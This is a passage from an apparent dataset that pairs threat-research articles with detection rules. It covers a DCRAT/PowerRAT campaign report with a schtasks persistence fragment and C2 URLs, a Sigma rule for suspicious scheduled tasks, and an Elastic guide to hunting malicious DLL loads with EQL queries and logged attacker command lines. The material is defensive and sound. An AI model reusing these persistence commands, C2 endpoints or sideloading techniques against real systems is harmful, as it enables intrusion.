/tr \"'C:\\Users\\admin\\AppData\\Local\\Temp\\file.exe'\" /rl HIGHEST /f`      |\n\n- The RAT communicates to the C2 server through a URL hardcoded in the RAT configuration file as shown in the picture and exfiltrates the sensitive data collected from the victim machine. From other DCRAT samples identified in this campaign, we found another C2 URL `hxxp[://]cr87986[.]tw1[.]ru/L1nc0In[.]php`.\n\n```image\nAlt: Sample of DCRAT configuration file.\nDescription: The image is a screenshot of a configuration file related to a Remote Access Trojan (RAT). It displays JSON data that includes a Command and Control (C2) server URL, plugin configurations with boolean values, and version information. The C2 URL is listed at the top, followed by options for plugin configs, indicating various settings for the RAT's operation. The structure of the JSON is consistent with configurations used in malicious software, highlighting its purpose in cyber threats.\nTranscription: |\n  json\n  {\n    \"C2\": [\n      \"http://strepsils.top/VideoVm_requestMultiTestLocal.php\"\n    ],\n    \"Options\": {\n      \"PluginConfigs\": {\n        \"0\": \"{$SYSTEMDRIVE}/Users/\",\n        \"1\": \"false\",\n        \"2\": \"false\",\n        \"3\": \"true\",\n        \"4\": \"true\",\n        \"5\": \"true\",\n        \"6\": \"true\",\n        \"7\": \"false\",\n        \"8\": \"true\",\n        \"9\": \"true\",\n        \"10\": \"true\",\n        \"11\": \"true\",\n        \"12\": \"true\",\n        \"13\": \"true\",\n        \"14\": \"true\"\n      }\n    },\n    \"Version\": \"5.0.1\",\n    \"Plugins\": ...\n```\n\n## Coverage\n\n```image\nAlt: Coverage\nDescription: The image is a table listing various Cisco security products along with their functionalities and features. Each product is associated with a check mark indicating its capabilities regarding malware protection and security measures. The products include Cisco Secure Endpoint, Cisco Secure Malware Analytics, Cisco Secure Email, Cisco Secure Firewall/Secure IPS, Cisco Secure Web Appliance, and Cisco Umbrella DNS Security. The table clearly outlines the relationship between these security solutions and their role in combating threats like PowerRAT and DCRAT.\nTranscription: |\n  | Cisco Secure Endpoint (AMP for Endpoints)    | Cloudlock                    | Cisco Secure Email | Cisco Secure Firewall/Secure IPS (Network Security) |\n  |----------------------------------------------|------------------------------|-------------------|------------------------------------------------------|\n  | ✔                                           | N/A                          | ✔                 | ✔                                                   |\n  | Cisco Secure Malware Analytics (Threat Grid) | Cisco Umbrella DNS Security | Cisco Umbrella SIG | Cisco Secure Web Appliance (Web Security Appliance)  |\n  | ✔                                           | ✔                           | ✔                 | ✔                                                   |\n```\n\nCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here.\n\nCisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks.\n\nCisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free here.\n\nCisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat.\n\nCisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.\n\nUmbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here.\n\nCisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network.\n\nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. Snort SIDs for this threat are 63963 – 63970, 63971 and 301004.\n\nClamAV detections are also available for this threat:\n\n- Win.Downloader.RustAgent-10036537-0\n- Win.Downloader.RustAgent-10036538-0\n- Win.Downloader.RustAgent-10036539-0\n- Win.Downloader.GoAgent-10036540-0\n- Win.Backdoor.PowershellRAT-10036541-0\n- Win.Phishing.VbsAgent-10036542-0\n- Win.Phishing.JsAgent-10036543-0\n- Win.Loader.PowershellLoader-10036544-0\n- Win.Loader.HtaAgent-10036545-0\n- Win.Loader.DonutLoader-10036546-0\n\n## IOCs\n\nIOCs for this research can be found in our GitHub repository here.",
    "sigma_rule": {
      "title": "Schedule Task Creation From Env Variable Or Potentially Suspicious Path Via Schtasks.EXE",
      "id": "81325ce1-be01-4250-944f-b4789644556f",
      "related": [
        {
          "id": "43f487f0-755f-4c2a-bce7-d6d2eec2fcf8",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects Schtask creations that point to a suspicious folder or an environment variable often used by malware",
      "references": [
        "https://www.welivesecurity.com/2022/01/18/donot-go-do-not-respawn/",
        "https://www.joesandbox.com/analysis/514608/0/html#324415FF7D8324231381BAD48A052F85DF04",
        "https://blog.talosintelligence.com/gophish-powerrat-dcrat/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-02-21",
      "modified": "2024-10-28",
      "tags": [
        "attack.execution",
        "attack.t1053.005"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_1_create": {
          "Image|endswith": "\\schtasks.exe",
          "CommandLine|contains": " /create "
        },
        "selection_1_all_folders": {
          "CommandLine|contains": [
            ":\\Perflogs",
            ":\\Users\\All Users\\",
            ":\\Users\\Default\\",
            ":\\Users\\Public",
            ":\\Windows\\Temp",
            "\\AppData\\Local\\",
            "\\AppData\\Roaming\\",
            "%AppData%",
            "%Public%"
          ]
        },
        "selection_2_parent": {
          "ParentCommandLine|endswith": "\\svchost.exe -k netsvcs -p -s Schedule"
        },
        "selection_2_some_folders": {
          "CommandLine|contains": [
            ":\\Perflogs",
            ":\\Windows\\Temp",
            "\\Users\\Public",
            "%Public%"
          ]
        },
        "filter_optional_other": [
          {
            "ParentCommandLine|contains": "unattended.ini"
          },
          {
            "CommandLine|contains": "update_task.xml"
          }
        ],
        "filter_optional_team_viewer": {
          "CommandLine|contains": "/Create /TN TVInstallRestore /TR"
        },
        "filter_optional_avira_install": {
          "CommandLine|contains|all": [
            "/Create /Xml \"C:\\Users\\",
            "\\AppData\\Local\\Temp\\.CR.",
            "Avira_Security_Installation.xml"
          ]
        },
        "filter_optional_avira_other": {
          "CommandLine|contains|all": [
            "/Create /F /TN",
            "/Xml ",
            "\\AppData\\Local\\Temp\\is-",
            "Avira_"
          ],
          "CommandLine|contains": [
            ".tmp\\UpdateFallbackTask.xml",
            ".tmp\\WatchdogServiceControlManagerTimeout.xml",
            ".tmp\\SystrayAutostart.xml",
            ".tmp\\MaintenanceTask.xml"
          ]
        },
        "filter_optional_klite_codec": {
          "CommandLine|contains|all": [
            "\\AppData\\Local\\Temp\\",
            "/Create /TN \"klcp_update\" /XML ",
            "\\klcp_update_task.xml"
          ]
        },
        "condition": "( all of selection_1_* or all of selection_2_* ) and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Benign scheduled tasks creations or executions that happen often during software installations",
        "Software that uses the AppData folder and scheduled tasks to update the software in the AppData folders"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_schtasks_env_folder.yml"
  },
  "14": {
    "url": "https://www.elastic.co/security-labs/Hunting-for-Suspicious-Windows-Libraries-for-Execution-and-Evasion",
    "markdown": "# Hunting for Suspicious Windows Libraries for Execution and Defense Evasion\n\n**Published on:** 1 March 2023\n\nLearn more about discovering threats by hunting through DLL load events, one way to reveal the presence of known and unknown malware in noisy process event data.\n\n---\n\n**Categories:** Security operations, Security research, Detection science\n\nDynamic-link library (DLL) image loads is one of the noisiest types of event in Windows, which may discourage defenders from using it for detection engineering or threat hunting. Even if logged in some environments, it’s often limited to function-specific DLLs such as scheduled tasks (taskschd.dll), Windows Management Instrumentation (wmiutil.dll) and potentially DLLs loading from a few suspicious folders. In addition to the data volume issue, the false positive (FP) rate of the detection rules using DLL events also tend to be proportional to the data volume.\n\nUnfortunately, both advanced adversaries and also commodity malwares are taking advantage of those limitations to increase the chances of their attack success, especially during the delivery phase via diverse spear phishing procedures.\n\nThe most commonly observed delivery techniques are the following:\n\n- Loading malicious DLLs using binary execution proxies Rundll32 and Regsvr32\n- Sideloading a malicious DLL from a virtual disk image (ISO/VHD files) into a convenient signed benign binary\n- Extracting a DLL from a malicious Microsoft Office document (i.e. Word, Excel) and immediately loading it via Visual Basic for Applications (VBA)\n- Downloading or extracting a DLL using a lolbin and loading it by another program\n- Sideloading a malicious DLL extracted from a compressed archive (zip, rar, etc) into a signed benign binary\n- Dropping a malicious DLL in the current directory of an existing program vulnerable to DLL sideloading (e.g. OneDrive, Slack, Teams) via one of several means\n- Less common but also very effective is the use of Windows Installer MSIEXEC to load a malicious DLL\n\n## What DLL events do we log with Elastic Endpoint?\n\nWith the exception of the following Microsoft DLLs, Elastic endpoint since version 7.16 records all non-Microsoft signed DLLs:\n\n```image\nAlt: DLL Events\nDescription: The image is a table listing various DLLs (Dynamic Link Libraries) that are categorized into three columns: 'Common functions,' 'Scripting engines,' and 'Others.' Each column contains specific DLL filenames, indicating their functions or purposes in the context of Windows execution and security. This table provides valuable information relevant to identifying and analyzing suspicious DLL activity, which is essential for threat hunting and defense evasion tactics in cybersecurity.\nTranscription: |\n  | Common functions                    | Scripting engines                   | Others                                      |\n  | ----------------------------------- | ----------------------------------- | ------------------------------------------- |\n  | Taskschd.dll                        | System.Management.Automation.dll    | mscorwks.dll                                |\n  | wmiutils.dll                        | System.Management.Automation.ni.dll | clr.dll                                     |\n  | psapi.dll                           | jscript.dll                         | Coreclr.dll                                 |\n  | msxml3.dll                          | jscript9.dll                        | ntoskrnl.exe                                |\n  | 7z.dll                              | chakra.dll                          | ntdll.dll (only if loaded a second time)    |\n  | pgpcrypt.dll                        | vbscript.dll                        | kernel32.dll (only if loaded a second time) |\n  | pgpencrypt.dll                      | scrobj.dll                          |                                             |\n  | wbemdisp.dll                        | scrrun.dll                          |                                             |\n  | wbemprox.dll                        |                                     |                                             |\n  | wbemsvc.dll                         |                                     |                                             |\n  | fastprox.dll                        |                                     |                                             |\n  | mstscax.dll                         |                                     |                                             |\n  | mstask.dll                          |                                     |                                             |\n  | bitsproxy.dll                       |                                     |                                             |\n  | qmgrprxy.dll                        |                                     |                                             |\n  | microsoft.backgroundintelligenttran |                                     |                                             |\n  | sfer.management.interop.dll         |                                     |                                             |\n  | ieproxy.dll                         |                                     |                                             |\n  | softokn3.dll                        |                                     |                                             |\n  | sqlite3.dll                         |                                     |                                             |\n  | nss3.dll                            |                                     |                                             |\n  | dsquery.dll                         |                                     |                                             |\n  | wminet_utils.dll                    |                                     |                                             |\n```\n\nWe also added some enrichments to both DLL and process events that records the following metadata:\n\n```image\nAlt: DLL and Process Events Metadata\nDescription: The image is a table comparing device metadata for binaries executed or loaded from different versions of software (version 8.2 and above vs. version 8.4 and above). It lists specific metadata fields such as 'Bus_type', 'Volume_device_type', 'Dos_name', and others related to the execution and modification times of executable files, highlighting how the enrichment of DLL and process events is enhanced in the newer version.\nTranscription: |\n  | Version 8.2 and above                                                                                   | Version 8.4 and above                                                                                                                                                                                                 |\n  | ------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n  | The device metadata from which a binary is executed/loaded (process.Ext.device.* and dll.Ext.device.*): | The time difference in seconds between a portable executable (PE) file creation and its execution time process.Ext.relative_file_creation_time (process events) and dll.Ext.relative_file_creation_time (dll events). |\n  | - Bus_type                                                                                              | The time difference in seconds between a PE file modification and its execution time process.Ext.relative_file_name_modify_time (process events) and dll.Ext.relative_file_name_modify_time (dll events).             |\n  | - Volume_device_type                                                                                    |                                                                                                                                                                                                                       |\n  | - Dos_name                                                                                              |                                                                                                                                                                                                                       |\n  | - Product_id                                                                                            |                                                                                                                                                                                                                       |\n  | - Vendor_id                                                                                             |                                                                                                                                                                                                                       |\n  | - Nt_name                                                                                               |                                                                                                                                                                                                                       |\n  | - file_system_type                                                                                      |                                                                                                                                                                                                                       |\n```\n\nBelow is an example of device information for DLL and Process execution from mounted ISO and VHD files, two file objects increasingly used to deliver malware:\n\n```image\nAlt: Device Information for DLL and Process Execution\nDescription: The image displays a side-by-side comparison of two JSON data outputs related to mounted virtual hard disk (VHD) and mounted ISO file systems. On the left, the mounted VHD details include information such as device type, volume device type, DOS name, product ID, vendor ID, NT name, and file system type. On the right, the mounted ISO contains similar attributes, specifically highlighting differences in the volume device type and DOS name, indicating it is a CD-ROM file system. This visual representation is aimed at illustrating the metadata logged during DLL and process event analysis in the context of cyber threat intelligence.\nTranscription: |\n  json\n  {\n    \"mounted_vhd\": {\n      \"code_signature\": [],\n      \"relative_file_creation_time\": 101526.9797176,\n      \"device\": {\n        \"bus_type\": \"FileBackedVirtual\",\n        \"volume_device_type\": \"Disk File System\",\n        \"dos_name\": \"G:\",\n        \"product_id\": \"Virtual Disk\",\n        \"vendor_id\": \"Msft\",\n        \"nt_name\": \"\\\\Device\\\\HarddiskVolume4\",\n        \"file_system_type\": \"NTFS\"\n      }\n    },\n    \"mounted_iso\": {\n      \"dll\": {\n        \"Ext\": {\n          \"code_signature\": [],\n          \"relative_file_creation_time\": 10902.7768791,\n          \"load_index\": 1,\n          \"device\": {\n            \"bus_type\": \"FileBackedVirtual\",\n            \"volume_device_type\": \"CD-ROM File System\",\n            \"dos_name\": \"D:\",\n            \"product_id\": \"Virtual DVD-ROM\",\n            \"vendor_id\": \"Msft\",\n            \"nt_name\": \"\\\\Device\\\\CdRom0\",\n            \"file_system_type\": \"UDF\"\n          }\n        }\n      }\n    }\n  }\n```\n\nHere is an example of process execution relative file creation and modification times for svchost.exe:\n\n```image\nAlt: Process Execution Times for svchost.exe\nDescription: The image shows a table with data related to the execution of the process 'svchost.exe'. It includes columns for 'process.name', 'process.Ext.relative_file_creation_time', and 'process.Ext.relative_file_name_modify_time'. The table appears to provide timestamps and details about the creation and modification times of files associated with the process, which could be used for analyzing suspicious activity related to DLLs and process executions.\nTranscription: |\n  | process.name | process.Ext.relative_file_creation_time | process.Ext.relative_file_name_modify_time |\n  | ------------ | --------------------------------------- | ------------------------------------------ |\n  | svchost.exe  | 132,036,580.248                         | 40,412,521.282                             |\n  | svchost.exe  | 132,036,580.091                         | 40,412,521.125                             |\n  | svchost.exe  | 132,036,577.985                         | 40,412,519.019                             |\n  | svchost.exe  | 132,036,576.562                         | 40,412,517.596                             |\n  | svchost.exe  | 132,036,571.521                         | 40,412,512.555                             |\n```\n\nThe relative execution time enrichment will help us create less noisy detection rules (we can match our rules against the first or few image load or process execution instances), and the device information will allow us to better target suspicious use of ISO/VHD files for malicious purposes.\n\n## Detection\n\nIn this section we share some detection ideas that are both reliable signals and effectively match the most common scenarios we mentioned earlier.\n\n### DLL via Rundll32 / Regsvr32\n\nAs captured in our own Global Threat Report, Rundll32 and Regsvr32 lolbins are two of the most abused binary execution proxies. These utilities can load malicious DLLs and are a commonly seen component of many phishing attacks (malicious shortcuts, ISO file, macro enabled documents):\n\n```image\nAlt: Rundll32 and Regsvr32\nDescription: The image is a pie chart illustrating the distribution of various executable files utilized for DLL execution, specifically highlighting the usage of 'regsvr32.exe' and 'rundll32.exe'. 'Regsvr32.exe' represents 68.77% of the total, while 'rundll32.exe' accounts for 15.96%. Other executables like 'file.exe', 'gagogo.exe', and several others contribute smaller percentages to the total. This visual representation aids in understanding the prevalence of these utilities in executing malicious DLLs, as discussed in the accompanying text.\nTranscription: |\n  rundll32.exe 15.96%\n  file.exe 5.37%\n  gagig.exe 3.37%\n  regsvr32.exe 68.77%\n  dqrhqi.exe 2.11%\n  msiexec.exe 0.96%\n  svchost.exe 0.54%\n  easinvoker.exe 0.37%\n  Other 0.82%\n```\n\nDuring a recent period of about 90 days, our internal malware sandbox saw roughly 21K malware alerts where the malicious file was a DLL loaded by either regsvr32 or to a lesser degree rundll32.\n\nThe following two endpoint behavior protection rules are effective against about 80% of those samples (~17k out of ~21k) leveraging rundll32 or regsvr32 to execute malicious modules:\n\n- Unusual DLL Extension Loaded by Rundll32 or Regsvr32\n- RunDLL32/Regsvr32 Loads Dropped Executable\n\n#### Rundll32 or Regsvr32 Executing an oversized File\n\nThe following EQL query correlates creation of an executable file event with file size equal or greater than 100MB (this threshold can be adjusted to your environment) subsequently followed by being loaded as a DLL via rundll32 or regsvr32:\n\n```image\nAlt: Oversized File Execution\nDescription: The image displays a code snippet written in EQL (Event Query Language) used for detecting suspicious Windows library executions via rundll32 or regsvr32. The snippet outlines a query sequence that filters for executable files larger than 100MB, excluding certain user IDs and focusing on specific file header bytes and extensions. It specifically checks for the execution of malicious control panel files and the use of rundll32 and regsvr32 processes, helping to identify potential defense evasion techniques utilized by attackers.\nTranscription: |\n  sequence with maxspan=5m\n  [file where event.action != \"deletion\" and not user.id : \"S-1-5-18\" and\n  /* size over 100MB */\n  file.size >= 100000000 and\n  file.Ext.header_bytes : \"4d5a*\" and not file.extension : \"exe\"] by file.path\n  [library where\n  process.name : (\"rundll32.exe\", \"regsvr32.exe\") and not dll.code_signature.trusted == true] by dll.path\n```\n\nBelow are examples of malicious control panel (CPL) files with sizes over 700MB, a technique used to bypass AV file scanning and reputation-based cloud services that implement a maximum file size for uploaded files:\n\n```image\nAlt: Malicious Control Panel Files\nDescription: The image displays a table containing event logs related to file creation and library loading events. Each row includes timestamps, paths to DLL files, file sizes, and the category of the events. The highlighted columns emphasize the file sizes, which are all over 700MB, indicating potential suspicious activity, as these oversized files may be used to bypass antivirus scanning.\nTranscription: |\n  @timestamp                      dll.path                                      file.path                                      file.size    event.category\n  Dec 21, 2021 @ 01:36:07.320    -                                              C:\\Users\\user\\AppData\\Local\\Temp\\1S3Y.cpl      715211949    file\n  Dec 21, 2021 @ 01:36:38.891    -                                              C:\\Users\\user\\AppData\\Local\\Temp\\1S3Y.cpl      -            -\n  Dec 21, 2021 @ 01:36:07.492    -                                              C:\\Users\\user\\AppData\\Local\\Temp\\jqOzCH.cpl    715531712    file\n  Dec 21, 2021 @ 01:37:02.759    C:\\Users\\user\\AppData\\Local\\Temp\\jqOzCH.cpl    -                                              -            -\n  Dec 25, 2021 @ 21:39:05.179    -                                              C:\\Users\\user\\AppData\\Local\\Temp\\Ng3Ry.cpl     714360320    file\n  Dec 25, 2021 @ 21:39:23.748    C:\\Users\\user\\AppData\\Local\\Temp\\Ng3Ry.cpl     -                                              -            -\n```\n\n#### Rundll32 or Regsvr32 loading a DLL with a suspicious original file name\n\nSome malicious DLLs have a suspicious original file name, such as ending with .EXE extension or with a great mismatch between the length of the original file name and the actual DLL name. This kind of defense evasion is less common and is employed by a good number of known malware families:\n\n```image\nAlt: Suspicious Original File Name\nDescription: The image displays a code snippet likely related to detecting suspicious DLLs being loaded via the Rundll32 or Regsvr32 processes. It outlines a query that looks for libraries where the process name is either 'rundll32.exe' or 'regsvr32.exe', filtering for those with original file names ending in '.exe', while excluding those with trusted code signature statuses. This is aimed at identifying potential defense evasion techniques used by malware.\nTranscription: |\n  library where process.name : (\"rundll32.exe\", \"regsvr32.exe\") and\n  dll.pe.original_file_name : \"*.exe\" and\n  not dll.code_signature.status : (\"trusted\", \"errorExpired\", \"errorCode_endpoint*\", \"errorChaining\")\n```\n\nA few examples:\n\n```image\nAlt: Examples of Suspicious DLLs\nDescription: The image displays a table containing data related to suspicious Windows libraries involved in execution and defense evasion. The columns include 'process.code_signature.subject_name,' 'process.name,' 'dll.pe.original_file_name,' and 'dll.name.' Each row represents an instance of a DLL being loaded, showing the process name (such as 'rundll32.exe' and 'regsvr32.exe'), the original file name ('SDFSSvc.exe'), and corresponding DLL names. This structured information provides critical insights into potential malicious activities within a Windows environment, making it relevant for cybersecurity analysis.\nTranscription: |\n  | process.code_signature.subject_n... | process.name | dll.pe.original_file_name | dll.name     |\n  | ----------------------------------- | ------------ | ------------------------- | ------------ |\n  | Microsoft Windows                   | rundll32.exe | SDFSSvc.exe               | 5kYYnRqi.cpl |\n  | Microsoft Windows                   | rundll32.exe | SDFSSvc.exe               | 5kYYnRqi.cpl |\n  | Microsoft Windows                   | regsvr32.exe | SDFSSvc.exe               | ikYawPA.0B   |\n  | Microsoft Windows                   | rundll32.exe | SDFSSvc.exe               | fQ3iU.Xv0    |\n```\n\n### DLL via Disk Images\n\nEmbedding malicious payloads in virtual disk images isn’t new or particularly novel, but the technique has gained in popularity among commodity malware families.\n\n#### Suspicious ImageLoad from an ISO Mounted Device\n\nThe following rule looks for the execution of commonly-abused Windows binaries to load a DLL from a mounted virtual disk image:\n\n```image\nAlt: Suspicious ImageLoad from ISO\nDescription: The image displays a code snippet likely written in a programming or query language, which outlines a sequence of conditions for detecting suspicious Windows libraries being executed from a mounted virtual disk image. It specifies various processes and their parent processes, along with checks for trusted code signatures and user IDs. The comments within the code indicate that it focuses on loading DLLs from a virtual disk, highlighting its relevance for cybersecurity detection purposes.\nTranscription: |\n  sequence by process.entity_id with maxspan=1m\n  [process where event.action == \"start\" and\n    process.name : (\"rundll32.exe\", \"regsvr32.exe\", \"odbcconf.exe\", \"certoc.exe\") and\n    process.parent.name : (\"cmd.exe\", \"explorer.exe\", \"powershell.exe\", \"winrar.exe\", \"7zFM.exe\")]\n  [library where\n    process.name : (\"rundll32.exe\", \"regsvr32.exe\", \"odbcconf.exe\", \"certoc.exe\") and\n    not dll.code_signature.trusted == true and\n    not user.id : (\"S-1-5-18\", \"S-1-5-19\", \"S-1-5-20\") and\n    /* loading dll from a mounted virtual disk */\n    (dll.path : \"\\\\Device\\\\CdRom*\" or\n     dll.Ext.device.product_id : (\"Virtual DVD-ROM\", \"Virtual Disk\"))]\n```\n\nBelow are some example of the technique:\n\n```image\nAlt: Examples of Suspicious ImageLoad\nDescription: The image displays a table containing data relevant to detecting suspicious ImageLoad events from ISO mounted devices. It has columns for 'rule.name', showcasing the top 5 values related to suspicious activities, 'process.command_line.wildcard' that lists command line arguments associated with these activities, 'Events.dll.path' showing the paths of DLL files involved, and 'Count of records' indicating the frequency of these events. This structured data is aimed at identifying potentially malicious activities related to the execution of DLLs from virtual disk images.\nTranscription: |\n  | Top 5 values of rule.name                       | Top 300 values of process.command_line.wildcard               | Top 300 values of Events.dll.path | Count of records |\n  | ----------------------------------------------- | ------------------------------------------------------------- | --------------------------------- | ---------------- |\n  | Suspicious ImageLoad from an ISO Mounted Device | regsvr32.exe /s /i ck.dll                                     | F:\\ck.dll                         | 6                |\n  | Suspicious ImageLoad from an ISO Mounted Device | regsvr32.exe /s /i ck.dll                                     | D:\\ck.dll                         | 3                |\n  | Suspicious ImageLoad from an ISO Mounted Device | rundll32 AllTheThingsx64.dll,#2                               | G:\\ALLTHINGSX64.DLL               | 6                |\n  | Suspicious ImageLoad from an ISO Mounted Device | rundll32 AllTheThingsx64.dll,#2                               | E:\\ALLTHINGSX64.DLL               | 1                |\n  | Suspicious ImageLoad from an ISO Mounted Device | \"C:\\Windows\\System32\\rundll32.exe\" invoice.dll, VoidFunc      | E:\\INVOICE.DLL                    | 2                |\n  | Suspicious ImageLoad from an ISO Mounted Device | \"C:\\Windows\\System32\\rundll32.exe\" invoice.dll, VoidFunc      | G:\\INVOICE.DLL                    | 1                |\n  | Suspicious ImageLoad from an ISO Mounted Device | \"C:\\Windows\\System32\\regsvr32.exe\" -e invoice.dll             | E:\\INVOICE.DLL                    | 1                |\n  | Suspicious ImageLoad from an ISO Mounted Device | \"C:\\Windows\\System32\\regsvr32.exe\" -e invoice.dll             | H:\\INVOICE.DLL                    | 1                |\n  | Suspicious ImageLoad from an ISO Mounted Device | rundll32 D:\\OfcPIC.dll, OIPC.InitPlus C:\\Users\\Public\\des.exe | D:\\ofcpic.dll                     | 1                |\n  | Suspicious ImageLoad from an ISO Mounted Device | rundll32 LDYwFaCXkhUuX.dll, Qruncore                          | D:\\LDYwFaCXkhUuX.dll              | 2                |\n  | Suspicious ImageLoad from an ISO Mounted Device | rundll32 WylvrnPdFUzVoh.dll, Pupdate                          | D:\\WylvrnPdFUzVoh.dll             | 2                |\n```\n\n#### Suspicious Microsoft Image Loaded from a Disk Image\n\nThe following rule is triggered when an executable, running from a mounted virtual disk image (.vhd, .iso), loads a suspicious Microsoft-signed DLL such as the taskschd, bitsproxy or vaultclient modules that are associated with some common malware capabilities like persistence, credential access, and evasion.\n\n```image\nAlt: Suspicious Microsoft Image Loaded\nDescription: The image depicts a code snippet relevant to detecting suspicious Windows libraries loaded from mounted virtual disk images. It includes a sequence query that filters processes based on their actions, specifically identifying those that start from a mounted virtual disk. The code checks for specific conditions, such as the type of device and the original file name, to determine if any suspicious Microsoft-signed DLLs (like ntdll.dll, kernel32.dll, tasksched.dll, bitsproxy.dll, and vaultcli.dll) are being loaded, which may indicate malicious activity associated with common malware capabilities.\nTranscription: |\n  sequence by process.entity_id with maxspan=5m\n  [process where event.action == \"start\" and\n  /*\n   Mounted virtual disk like ISO, VHD/x\n  */\n  process.Ext.device.bus_type == \"FileBackedVirtual\" and\n  not (process.pe.original_file_name :\n  (\"Bootstrapper.exe\", \"DVDSetup.exe\") and process.code_signature.trusted == true)]\n  [library where\n  /*\n   Elastic logs ntdll and kernel32 if they are loaded more than once by the same pid\n   taskschd may indicate scheduled task capability\n   vaultcli may indicate vault credentials access capability\n   bitsproxy may indicate file upload/download or persistence via BITS\n  */\n  dll.name : (\"ntdll.dll\", \"kernel32.dll\", \"taskschd.dll\", \"bitsproxy.dll\", \"vaultcli.dll\")]\n```\n\nThis query identifies many commodity malware families delivered via ISO files:\n\n```image\nAlt: Commodity Malware Families\nDescription: The image displays a structured query output showing the relationships between processes and DLLs in a cybersecurity context. It includes details such as the names of the processes, the libraries they loaded, and the event categories. The layout features colored sections for different processes, highlighting the flow of execution from one process to another, with specific focus on the 'vaultcli.dll' library being loaded by the processes 'Orden de compra_(P_O_602915A)_Macromundo.exe' and 'Consulta 89000013.pdf.exe'. This visual representation aids in understanding how suspicious DLLs are being utilized in the context of offense and defense evasion.\nTranscription: |\n  | dll.Ext.device.bus_type | dll.name                                                         | event.category                                                   |\n  | ----------------------- | ---------------------------------------------------------------- | ---------------------------------------------------------------- |\n  | process                 | Orden de compra_(P_O_6022915A)_Macromundo.exe                    | (1296) D:\\Orden de compra_(P_O_6022915A)_Macromundo.exe          | (9068) |\n  |                         | # 7cc49dd65157f14edc0f37a7d46951da17dc499bdd0911694811811182f9bd |\n  | library                 | vaultcli.dll                                                     |\n  |                         | _user @ HOST1                                                    | loaded library via Orden de compra_(P_O_6022915A)_Macromundo.exe | (1296) |\n  | process                 | HOST1                                                            | D:\\Consulta 89000013.pdf.exe                                     | (140) via parent process Consulta 89000013.pdf.exe | (8084) |\n  |                         | # b8778c93226e53751a30b74c645a4fbc3ab8485fa924f199               |\n  | library                 | vaultcli.dll                                                     |\n  |                         | _user @ HOST1                                                    | loaded library via Consulta 89000013.pdf.exe                     | (140) |\n```\n\n#### Potential DLL SideLoad via a Renamed Signed Binary\n\nThe following query identifies attempts to load an unsigned DLL from a mounted virtual disk (.iso, .vhd) and using a renamed signed binary (original file name is different than the process name).\n\n```image\nAlt: Potential DLL SideLoad via Renamed Signed Binary\nDescription: The image displays a code snippet written in a programming or scripting language, likely related to security monitoring. It contains comments explaining the purpose of the code, which is to detect signed Portable Executable (PE) files that have been renamed and are potentially being used for malicious activities, specifically targeting virtual disk images like ISO or VHD files. The code outlines a sequence of events to identify processes that start with a trusted signature but have a different name than the original file name, indicating a potential side-loading attempt.\nTranscription: |\n  /*\n  Signed PE with OriginalFileName different than process.name (renamed) as potential target from a malicious ISO/DMG/VHD archive\n  */\n  sequence by process.entity_id with maxspan=1m\n  [process where event.action == \"start\" and process.pe.original_file_name != null and\n  process.code_signature.trusted == true and\n  not startswith~(process.name, process.pe.original_file_name) and\n  process.Ext.device.product_id : (\"Virtual DVD-ROM\", \"Virtual Disk\")]\n  [library where\n  dll.Ext.device.product_id : (\"Virtual DVD-ROM\", \"Virtual Disk\") and\n  not dll.code_signature.status : (\"trusted\", \"errorExpired\", \"errorCode_endpoint*\", \"errorChaining\")]\n```\n\nThis depicts some examples of matches where a signed and renamed program is loading a DLL from a mounted disk image:\n\n```image\nAlt: Examples of Renamed Signed Binary\nDescription: The image displays a data table that lists various attributes related to processes, including timestamps, process code signatures, process names, original file names, DLL names, and event categories. It details instances where processes (like 'des.exe' and 'troubleshoot.exe') are loading DLLs (such as 'ofcpipc.dll' and 'jvm.dll') from mounted disk images, highlighting potential DLL sideloading attempts. The table is structured with alternating background colors for readability, and it clearly presents the relationship between processes and libraries involved.\nTranscription: |\n  | @timestamp                  | process.code_signature.s... | process.name     | process.pe.original_file_name | dll.name    | event.category |\n  | --------------------------- | --------------------------- | ---------------- | ----------------------------- | ----------- | -------------- |\n  | Oct 18, 2022 @ 13:39:12.125 | Trend Micro, Inc.           | des.exe          | LogServer                     |             | process        |\n  | Oct 18, 2022 @ 13:39:12.259 | Trend Micro, Inc.           | des.exe          |                               | ofcpipc.dll | library        |\n  | Nov 4, 2022 @ 00:53:03.812  | JetBrains s.r.o.            | troubleshoot.exe |                               |             | process        |\n  | Nov 4, 2022 @ 00:53:03.951  | JetBrains s.r.o.            | troubleshoot.exe |                               | jvm.dll     | library        |\n```\n\n#### Potential DLL SideLoad via a Microsoft Signed Binary\n\nThis detection identifies attempts to load unsigned DLLs from a mounted virtual disk (.iso, .vhd) and using a signed Microsoft binary:\n\n```image\nAlt: Potential DLL SideLoad via Microsoft Signed Binary\nDescription: The image displays a code snippet written in a programming or query language, likely related to security or malware detection. It outlines a library function that filters for dynamic link libraries (DLLs) based on certain criteria. The criteria include checking for virtual disk identifiers, ensuring the executable is not from a specific directory, and confirming that the DLL code signature is not marked as trusted or expired. This snippet is relevant to detecting potential security threats associated with DLL sideloading.\nTranscription: |\n  library where\n      dll.Ext.device.product_id : (\"Virtual DVD-ROM\", \"Virtual Disk\") and\n      process.code_signature.subject_name : \"Microsoft\" and\n      not dll.code_signature.status : (\"trusted\", \"errorExpired\", \"errorCode_endpoint*\", \"errorChaining\") and\n      not process.executable : 